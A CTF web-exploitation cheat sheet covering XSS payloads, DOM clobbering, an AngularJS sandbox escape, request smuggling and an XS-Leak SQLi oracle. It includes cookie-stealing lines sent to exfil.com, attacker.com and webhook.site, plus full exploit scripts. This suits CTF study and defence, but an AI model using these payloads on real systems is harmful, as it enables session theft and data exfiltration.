# CTF Web - XSS, DOM and Browser Tricks

## Table of Contents
- [XSS Payloads](#xss-payloads)
  - [Basic](#basic)
  - [Cookie Exfiltration](#cookie-exfiltration)
  - [Filter Bypass](#filter-bypass)
  - [Hex/Unicode Bypass](#hexunicode-bypass)
- [浏览器侧短案例技巧族：DOM、缓存、路径与跳转](#浏览器侧短案例技巧族dom缓存路径与跳转)
  - [DOMPurify Bypass via Trusted Backend Routes](#dompurify-bypass-via-trusted-backend-routes)
  - [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
  - [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
  - [Cache Poisoning](#cache-poisoning)
  - [Hidden DOM Elements](#hidden-dom-elements)
  - [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
  - [Magic Link + Redirect Chain XSS](#magic-link-redirect-chain-xss)
  - [Content-Type via File Extension](#content-type-via-file-extension)
- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
  - [速查补充](#速查补充)
- [Shadow DOM XSS](#shadow-dom-xss)
  - [速查补充](#速查补充-1)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering-mime-mismatch)
  - [速查补充](#速查补充-2)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
  - [速查补充](#速查补充-3)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
  - [速查补充](#速查补充-4)
- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
- [JSFuck Decoding](#jsfuck-decoding)
  - [速查补充](#速查补充-5)
- [AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)](#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)
- [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
  - [Admin Bot javascript: URL Scheme Bypass](#admin-bot-javascript-url-scheme-bypass)
- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing-graphql-csrf-htb-grandmonty)
  - [Why it works](#why-it-works)
  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1-redirect-bot-via-meta-refresh-csp-bypass)
  - [Step 2 — Timing oracle via image loads](#step-2-timing-oracle-via-image-loads)
  - [Step 3 — Character-by-character extraction](#step-3-character-by-character-extraction)
  - [Step 4 — Host exploit and tunnel](#step-4-host-exploit-and-tunnel)
  - [速查补充](#速查补充-6)
- [XSS 速查](#xss-速查)
---

## XSS Payloads

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Cookie Exfiltration
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literal -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space -->
```

### Hex/Unicode Bypass
- Hex encoding: `\x3cscript\x3e`
- HTML entities: `&#60;script&#62;`

---

## 浏览器侧短案例技巧族：DOM、缓存、路径与跳转

### DOMPurify Bypass via Trusted Backend Routes

Frontend sanitizes before autosave, but backend trusts autosave — no sanitization.
Exploit: POST directly to `/api/autosave` with XSS payload.

---

### JavaScript String Replace Exploitation

`.replace()` special patterns: `$\`` = content BEFORE match, `$'` = content AFTER match
Payload: `<img src="abc$\`<img src=x onerror=alert(1)>">`

---

### Client-Side Path Traversal (CSPT)

Frontend JS uses URL param in fetch without validation:
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
Exploit: `/user/profile?id=../admin/addAdmin` → fetches `/admin/addAdmin` with CSRF body

Parameter pollution: `/user/profile?id=1&id=../admin/addAdmin` (backend uses first, frontend uses last)

---

### Cache Poisoning

CDN/cache keys only on URL:
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
# All visitors to /search?query=harmless get XSS
```

---

### Hidden DOM Elements

Proof/flag in `display: none`, `visibility: hidden`, `opacity: 0`, or off-screen elements:
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));

// Find all hidden content
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

---

### React-Controlled Input Programmatic Filling

React ignores direct `.value` assignment. Use native setter + events:
```javascript
const input = document.querySelector('input[placeholder="SDG{...}"]');
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
input.dispatchEvent(new Event('change', { bubbles: true }));
```

Works for React, Vue, Angular. Essential for automated form filling via DevTools.

---

### Magic Link + Redirect Chain XSS
```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// Sets auth cookies, then redirects to attacker-controlled XSS page
```

---

### Content-Type via File Extension
```javascript
// @fastify/static determines Content-Type from extension
noteId = '<img src=x onerror="alert(1)">.html'
// Response: Content-Type: text/html → XSS
```

---

## DOM XSS via jQuery Hashchange (Crypto-Cat)

**Vulnerable pattern:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**Exploit via iframe:** Trigger hashchange without direct user interaction by loading the target in an iframe, then modifying the hash via `onload`:
```html
<iframe src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**关键结论：** The iframe's `onload` fires after the initial load, then changing `this.src` triggers a `hashchange` event in the target page. The hash content (`<img src=x onerror=print()>`) passes through jQuery's `$()` which interprets it as HTML, creating a DOM element with the XSS payload.

---

### 速查补充

`$(location.hash)` + `hashchange` event → XSS via iframe: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`. See xss-dom-and-browser-tricks.md.


---
## Shadow DOM XSS

**Closed Shadow DOM exfiltration (Pragyan 2026):** Wrap `attachShadow` in a Proxy to capture shadow root references:
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.

**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.

---

### 速查补充

Proxy `attachShadow` to capture closed roots; `(0,eval)` for scope escape; `</script>` injection. See xss-dom-and-browser-tricks.md.


---
## DOM Clobbering + MIME Mismatch

**MIME type confusion (Pragyan 2026):** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.

**Form-based DOM clobbering:**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

---

### 速查补充

`.jpg` served as `text/html`; `<form id="config">` clobbers JS globals. See xss-dom-and-browser-tricks.md.


---
## HTTP Request Smuggling via Cache Proxy

**Cache proxy desync (Pragyan 2026):** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.

**Cookie theft pattern:**
1. Create cached resource (e.g., blog post)
2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
3. Cache proxy returns cached response, doesn't consume POST body
4. Admin bot's next request bytes fill the POST body → stored on server
5. Read stored request to extract admin's cookies

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

---

### 速查补充

Cache proxy desync for cookie theft via incomplete POST body. See xss-dom-and-browser-tricks.md.


---
## CSS/JS Paywall Bypass

**模式（Great Paywall, MetaCTF 2026）：** Article content is fully present in the HTML but hidden behind a CSS/JS overlay (`position: fixed; z-index: 99999; backdrop-filter: blur(...)` with a "Subscribe" CTA).

**Quick solve:** `curl` the page — no CSS/JS rendering means the full article (and flag) are in the raw HTML.

```bash
curl -s https://target/article | grep -i "flag\|CTF{"
```

**Alternative approaches:**
- View page source in browser (Ctrl+U)
- Browser DevTools → delete the overlay element
- Disable JavaScript in browser settings
- `document.querySelector('#paywall-overlay').remove()` in console
- Googlebot user-agent: `curl -H "User-Agent: Googlebot" https://target/article`

**关键结论：** Many paywalls are client-side DOM overlays — the content is always in the HTML. The leetspeak hint "paywalls are just DOM" confirms this. Always try `curl` or view-source first before more complex approaches.

---

### 速查补充

Content behind CSS overlay (`position: fixed; z-index: 99999`) is still in the raw HTML. `curl` or view-source bypasses it instantly. See xss-dom-and-browser-tricks.md.


---
## JPEG+HTML Polyglot XSS (EHAX 2026)

**模式（Metadata Meyham）：** File upload accepts JPEG, serves uploaded files with permissive MIME type. Admin bot visits reported files.

**Attack:** Create a JPEG+HTML polyglot — valid JPEG header followed by HTML/JS payload:
```python
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

# HTML payload appended after JPEG data
html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  // Fetch admin page content
  var r = await fetch("/admin");
  var t = await r.text();
  // Exfiltrate via self-upload (stays on same origin)
  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
  var b = new Blob([j], {type:'image/jpeg'});
  var f = new FormData();
  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
  await fetch('/upload', {method:'POST', body:f});
  // Also try external webhook
  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
# Upload as .html with image/jpeg content type
```

**PoW bypass:** Many CTF report endpoints require SHA-256 proof-of-work:
```python
import hashlib
nonce = 0
while True:
    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
    if h.startswith('0' * difficulty):
        break
    nonce += 1
```

**Exfiltration methods (ranked by reliability):**
1. **Self-upload:** Fetch `/admin`, upload result as filename → check `/files` for new uploads
2. **Webhook:** `fetch('https://webhook.site/ID?flag='+data)` — may be blocked by CSP
3. **DNS exfil:** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'` — bypasses most CSP

**关键结论：** JPEG files are tolerant of trailing data. Browsers parse HTML from anywhere in the response when MIME allows it. The polyglot is simultaneously a valid JPEG and valid HTML.

---

## JSFuck Decoding

**模式（JShit, PascalCTF 2026）：** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```

---

### 速查补充

Remove trailing `()()`, eval in Node.js, `.toString()` reveals original code. See xss-dom-and-browser-tricks.md.


---
## AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)

**Payload:**
```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
```

**How it works:**
1. `toString().constructor.prototype` accesses `String.prototype`
2. `a.charAt=a.trim` replaces `charAt` with `trim` on all strings
3. The sandbox calls `charAt(0)` on identifiers to validate them -- but `trim` returns the full string instead of a single character
4. This breaks the character-by-character validation, allowing any expression
5. `$eval('expression')` evaluates arbitrary JavaScript in the Angular scope

**Shorter variants for different AngularJS versions:**
```javascript
<!-- AngularJS 1.5.x -->
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}

<!-- AngularJS 1.4.x -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}

<!-- AngularJS 1.3.x -->
{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
```

**关键结论：** The sandbox relies on `charAt` to validate identifiers. Replacing it with `trim` (which returns the full string) bypasses the character-by-character check, allowing arbitrary expression evaluation. AngularJS 1.6+ removed the sandbox entirely (acknowledging it was never a security boundary), but many CTFs and legacy apps still use older versions.

---

## Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)

**模式（Mirror Temple）：** Admin bot navigates to user-supplied URL, validates with `new URL()` which only checks syntax — not protocol scheme. `javascript:` URLs pass validation and execute arbitrary JS in the bot's authenticated context.

**Vulnerable validation:**
```javascript
try {
  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
} catch {
  process.exit(1)
}
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
```

**Exploit:**
```bash
# 1. Create authenticated session (bot requires valid cookie)
curl -i -X POST 'https://target/postcard-from-nyc' \
  --data-urlencode 'name=test' \
  --data-urlencode 'flag=dice{test}' \
  --data-urlencode 'portrait='
# Extract save=... cookie from Set-Cookie header

# 2. Submit javascript: URL to report endpoint
curl -X POST 'https://target/report' \
  -H 'Cookie: save=YOUR_COOKIE' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

**Why CSP/SRI don't help (B-Side variant):** The B-Side adds inlined CSS, SRI integrity hashes on scripts, and strict CSP. None of these matter because `javascript:` URLs execute in a **navigation context** — the bot navigates to the JS URL directly, not injecting into an existing page. The CSP of the target page is irrelevant since the JS runs before any page loads.

**Fix:**
```javascript
const u = new URL(targetUrl)
if (!['http:', 'https:'].includes(u.protocol)) {
  process.exit(1)
}
```

**关键结论：** `new URL()` is a **syntax** validator, not a **security** validator. It accepts `javascript:`, `data:`, `file:`, `blob:`, and other dangerous schemes. Any admin bot or SSRF handler using `new URL()` alone for validation is vulnerable. Always allowlist protocols explicitly.

---

### Admin Bot javascript: URL Scheme Bypass

`new URL()` validates syntax only, not protocol — `javascript:` URLs pass and execute in Puppeteer's authenticated context. CSP/SRI on the target page are irrelevant since JS runs in navigation context. See xss-dom-and-browser-tricks.md.


---
## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

### Why it works

1. **GraphQL GET CSRF:** Many GraphQL implementations accept GET requests (not just POST+JSON). GET requests with images bypass CORS preflight — no `OPTIONS` check needed.
2. **Bot runs on localhost:** The admin bot's browser can reach `localhost:1337/graphql` which is restricted from external access.
3. **Image error timing:** `new Image().src = url` fires `onerror` after the server responds. If SQL `SLEEP(1)` executes, the response is slow → timing difference reveals whether a character matches.

### Step 1 — Redirect bot via meta refresh (CSP bypass)

When CSP blocks inline scripts, use HTML injection with `<meta>` redirect:
```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
```

The bot navigates to the attacker page, where JavaScript executes freely (different origin, no CSP restriction).

### Step 2 — Timing oracle via image loads

```javascript
const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onload = () => resolve(0);
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};

const xsLeaks = async (query) => {
    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
        encodeURIComponent(query);
    let delay = await imageLoadTime(imgURL);
    return delay >= 1000;  // SLEEP(1) threshold
};
```

### Step 3 — Character-by-character extraction

```javascript
let sqlTemp = `query {
    RansomChat(enc_id: "123' and __LEFT__ = __RIGHT__)-- -")
    {id, enc_id, message, created_at} }`;

let readQueryTemp = `(select sleep(1) from dual where
    BINARY(SUBSTRING((select password from db.users
    where username = 'target'),__POS__,1))`;

let flag = '';
for (let pos = 1; ; pos++) {
    for (let c of charset) {
        let readQuery = readQueryTemp.replace('__POS__', pos);
        let sql = sqlTemp.replace('__LEFT__', readQuery)
                         .replace('__RIGHT__', `'${c}'`);
        if (await xsLeaks(sql)) {
            flag += c;
            new Image().src = exfilURL + '?d=' + encodeURIComponent(flag);
            break;
        }
    }
}
```

### Step 4 — Host exploit and tunnel

```bash
# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
cloudflared tunnel --url http://localhost:8888
python3 -m http.server 8888
```

**关键结论：** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.


---

### 速查补充

HTML injection → meta refresh redirect (CSP bypass) → admin bot loads attacker page → JavaScript makes cross-origin GET requests to `localhost` GraphQL endpoint via `new Image().src` → measures time-based SQLi (`SLEEP(1)`) through image error timing → character-by-character flag exfiltration. GraphQL GET requests bypass CORS preflight. See xss-dom-and-browser-tricks.md.
## XSS 速查
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Filter bypass: hex `\x3cscript\x3e`, entities `&#60;script&#62;`, case mixing `<ScRiPt>`, event handlers.
- **XSS dot-filter bypass:** Decimal IP (`1558071511` = `92.123.45.67`) eliminates dots from URLs. JavaScript bracket notation (`document["cookie"]`) replaces dot property access. See csp-xsleak-and-browser-exfiltration.md.
- **Cross-origin cookie XSS:** Set cookie with `domain=.parent.tld` from one subdomain to inject XSS payload rendered on a sibling subdomain. See csp-xsleak-and-browser-exfiltration.md.
- **AngularJS 1.x sandbox escape:** Override `String.prototype.charAt` with `trim` to bypass AngularJS expression sandbox, then `$eval` arbitrary JS. See xss-dom-and-browser-tricks.md.

See xss-dom-and-browser-tricks.md for DOMPurify bypass, cache poisoning, CSPT, React input tricks.


---
